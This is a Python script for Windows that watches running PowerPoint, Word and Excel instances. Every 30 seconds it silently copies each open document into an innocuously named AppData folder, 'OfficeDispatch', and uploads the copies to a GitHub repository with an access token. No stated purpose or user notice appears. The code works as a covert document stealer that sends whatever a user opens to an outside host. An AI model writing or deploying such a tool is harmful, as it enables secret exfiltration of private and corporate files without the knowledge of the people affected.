import win32com.client
import xlwings as xw
import os
import shutil
import datetime
import time
import hashlib
from github import Github

def initialize_com_object(app_name):
    while True:
        try:
            app = win32com.client.Dispatch(app_name)
            return app
        except Exception as e:
            print(f"Error initializing {app_name}: {e}. Retrying in 10 seconds...")
            time.sleep(10)

ppt = initialize_com_object("PowerPoint.Application")
word = initialize_com_object("Word.Application")

appdata_path = os.getenv('APPDATA')
repo_path = os.path.join(appdata_path, "OfficeDispatch")

os.makedirs(repo_path, exist_ok=True)

processed_files = set()
log_initialized = False

def log_message(message, log_file_path):
    global log_initialized
    if not log_initialized:
        if os.path.exists(log_file_path) and os.path.getsize(log_file_path) > 0:
            with open(log_file_path, 'a', encoding='utf-8') as log:
                log.write('\n')
        log_initialized = True
    with open(log_file_path, "a", encoding='utf-8') as log_file:
        log_file.write(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")

def calculate_md5(file_path):
    hash_md5 = hashlib.md5()
    with open(file_path, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()

def copy_file(file_name, file_size, category, target_folder, log_file_path):
    try:
        dest_folder = os.path.join(target_folder, category)
        dest_file_path = os.path.join(dest_folder, os.path.basename(file_name))
        
        if os.path.exists(dest_file_path) and calculate_md5(file_name) == calculate_md5(dest_file_path):
            log_message(f"File {file_name} already exists and is identical, skipping copy", log_file_path)
            return False
        
        shutil.copy(file_name, dest_folder)
        log_message(f"Copied {file_name} to {dest_folder} successfully", log_file_path)
        return True
    except Exception as e:
        log_message(f"Failed to copy {file_name} due to {e}", log_file_path)
        return False

def process_files():
    log_file_path = None
    try:
        current_date = datetime.datetime.now().strftime("%Y.%m.%d")
        target_folder = os.path.join(repo_path, current_date)

        os.makedirs(os.path.join(target_folder, "PowerPoint"), exist_ok=True)
        os.makedirs(os.path.join(target_folder, "Excel"), exist_ok=True)
        os.makedirs(os.path.join(target_folder, "Word"), exist_ok=True)

        log_file_path = os.path.join(target_folder, "log.txt")

        new_files_detected = False

        if ppt:
            for presentation in ppt.Presentations:
                file_name = presentation.FullName
                if file_name not in processed_files:
                    processed_files.add(file_name)
                    file_size = os.path.getsize(file_name)
                    if copy_file(file_name, file_size, "PowerPoint", target_folder, log_file_path):
                        new_files_detected = True

        try:
            for book in xw.books:
                file_name = book.fullname
                if file_name not in processed_files:
                    processed_files.add(file_name)
                    file_size = os.path.getsize(file_name)
                    if copy_file(file_name, file_size, "Excel", target_folder, log_file_path):
                        new_files_detected = True
        except Exception as e:
            print(f"No Excel instances found: {e}")

        if word:
            for document in word.Documents:
                file_name = document.FullName
                if file_name not in processed_files:
                    processed_files.add(file_name)
                    file_size = os.path.getsize(file_name)
                    if copy_file(file_name, file_size, "Word", target_folder, log_file_path):
                        new_files_detected = True

        return new_files_detected, target_folder, log_file_path
    except Exception as e:
        if log_file_path:
            log_message(f"Error in processing files: {e}", log_file_path)
        return False, None, None

def upload_to_github(repo_name, commit_message, token, target_folder, log_file_path):
    try:
        g = Github(token)
        user = g.get_user()
        repo = user.get_repo(repo_name)
        
        commit_files = []
        for root, dirs, files in os.walk(target_folder):
            for file_name in files:
                if file_name == "log.txt":
                    continue
                file_path = os.path.join(root, file_name)
                with open(file_path, "rb") as file:
                    content = file.read()
                
                rel_path = os.path.relpath(file_path, repo_path).replace("\\", "/")
                try:
                    existing_file = repo.get_contents(rel_path)
                    if existing_file.sha != hashlib.sha1(content).hexdigest():
                        repo.update_file(
                            path=rel_path,
                            message=commit_message,
                            content=content,
                            sha=existing_file.sha,
                            branch="main"
                        )
                        commit_files.append(rel_path)
                except:
                    repo.create_file(
                        path=rel_path,
                        message=commit_message,
                        content=content,
                        branch="main"
                    )
                    commit_files.append(rel_path)
        
        if commit_files:
            log_message(f"Files uploaded to GitHub successfully: {', '.join(commit_files)}", log_file_path)
        else:
            log_message("No changes detected, no files uploaded", log_file_path)
    except Exception as e:
        log_message(f"Failed to upload files to GitHub due to {e}", log_file_path)

repo_name = "your_repo_name"
commit_message = "your_commit_message"
github_token = "enter_your_gitub_token_here"

while True:
    new_files_detected, target_folder, log_file_path = process_files()
    if new_files_detected:
        upload_to_github(repo_name, commit_message, github_token, target_folder, log_file_path)
    time.sleep(30)
